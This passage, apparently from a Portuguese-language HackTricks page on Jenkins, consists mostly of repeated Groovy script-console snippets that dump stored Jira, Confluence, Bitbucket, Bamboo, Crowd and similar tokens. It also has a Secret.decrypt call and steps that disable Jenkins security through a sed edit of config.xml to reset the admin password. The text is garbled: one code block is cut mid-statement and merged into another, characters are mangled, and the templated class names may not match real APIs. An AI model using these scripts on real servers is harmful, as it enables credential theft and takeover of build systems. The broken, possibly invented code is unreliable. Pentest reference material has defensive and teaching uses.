for (c in store.getCredentials(domain)) {
    if (c instanceof ZendeskToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Jira tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.jira.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof JiraToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Confluence tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.confluence.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof ConfluenceToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Bitbucket Server tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.atlassian.bitbucket.jenkins.internal.credentials.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof BitbucketServerToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Bamboo tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.atlassian.bamboo.jenkins.internal.credentials.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof BambooToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Crowd tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.atlassian.crowd.jenkins.internal.credentials.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof CrowdToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Fisheye tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.atlassian.fisheye.jenkins.internal.credentials.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Criar novo usu√°rio admin

1. Acesse o arquivo config.xml do Jenkins em `/var/lib/jenkins/config.xml` ou `C:\Program Files (x86)\Jenkis\`
2. Procure pela palavra `<useSecurity>true</useSecurity>` e altere a palavra **`true`** para **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Reinicie** o servidor **Jenkins**: `service jenkins restart`
4. Agora v√° novamente ao portal do Jenkins e **o Jenkins n√£o pedir√° nenhuma credencial** desta vez. Navegue at√© "**Manage Jenkins**" para definir a **senha do administrador novamente**.
5. **Habilite** a **seguran√ßa** novamente alterando as configura√ß√µes para `<useSecurity>true</useSecurity>` e **reinicie o Jenkins novamente**.

## Refer√™ncias

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Aprenda & pratique AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda & pratique GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
